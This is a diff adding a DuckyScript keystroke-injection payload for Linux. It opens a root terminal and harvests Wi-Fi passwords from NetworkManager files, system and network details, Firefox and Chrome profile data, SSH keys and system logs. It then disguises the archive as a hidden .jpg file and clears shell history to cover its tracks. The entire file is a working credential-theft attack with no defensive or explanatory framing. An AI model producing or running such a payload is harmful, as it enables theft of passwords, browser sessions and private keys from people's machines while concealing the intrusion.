@@ -1,0 +1,86 @@
+DELAY 5000
+
+REM Open a terminal with root privileges
+CTRLALT t
+DELAY 1000
+STRING sudo -s
+ENTER
+DELAY 2000
+STRING echo "hacked" && clear
+ENTER
+
+REM Create directories for data collection
+STRING mkdir -p ~/Desktop/info/LinuxVault
+ENTER
+STRING mkdir -p ~/Desktop/info/BrowserData
+ENTER
+
+REM Capture Wi-Fi passwords
+STRING echo "=========== Wi-Fi Passwords ===========" > ~/Desktop/info/info.txt
+ENTER
+STRING cat /etc/NetworkManager/system-connections/* | grep -E "ssid=|psk=" >> ~/Desktop/info/info.txt
+ENTER
+
+REM Capture system information
+STRING echo "=========== System Information ===========" >> ~/Desktop/info/info.txt
+ENTER
+STRING uname -a >> ~/Desktop/info/info.txt
+ENTER
+STRING lsb_release -a >> ~/Desktop/info/info.txt
+ENTER
+STRING df -h >> ~/Desktop/info/info.txt
+ENTER
+STRING free -m >> ~/Desktop/info/info.txt
+ENTER
+
+REM Capture network information
+STRING echo "=========== Network Information ===========" >> ~/Desktop/info/info.txt
+ENTER
+STRING ip a >> ~/Desktop/info/info.txt
+ENTER
+STRING ip r >> ~/Desktop/info/info.txt
+ENTER
+STRING cat /etc/resolv.conf >> ~/Desktop/info/info.txt
+ENTER
+STRING netstat -tulnp >> ~/Desktop/info/info.txt
+ENTER
+
+REM Capture running processes
+STRING echo "=========== Running Processes ===========" >> ~/Desktop/info/info.txt
+ENTER
+STRING ps aux >> ~/Desktop/info/info.txt
+ENTER
+
+REM Capture browser data (Chrome and Firefox)
+STRING cp -r ~/.mozilla/firefox/*.default-release ~/Desktop/info/BrowserData/Firefox
+ENTER
+STRING cp -r ~/.config/google-chrome/Default ~/Desktop/info/BrowserData/Chrome
+ENTER
+
+REM Capture SSH keys
+STRING mkdir -p ~/Desktop/info/SSH
+ENTER
+STRING cp -r ~/.ssh/* ~/Desktop/info/SSH/
+ENTER
+
+REM Capture logs
+STRING cp -r /var/log ~/Desktop/info/LinuxVault/
+ENTER
+
+REM Compress collected data
+STRING tar -czf ~/Desktop/info_$(date +%F).tar.gz -C ~/Desktop/info
+ENTER
+DELAY 10000
+
+REM Hide collected data
+STRING mv ~/Desktop/info_$(date +%F).tar.gz ~/Desktop/.hiddenfile.jpg
+ENTER
+
+REM Clean up traces
+STRING rm -rf ~/Desktop/info
+ENTER
+STRING history -c
+ENTER
+
+STRING exit
+ENTER
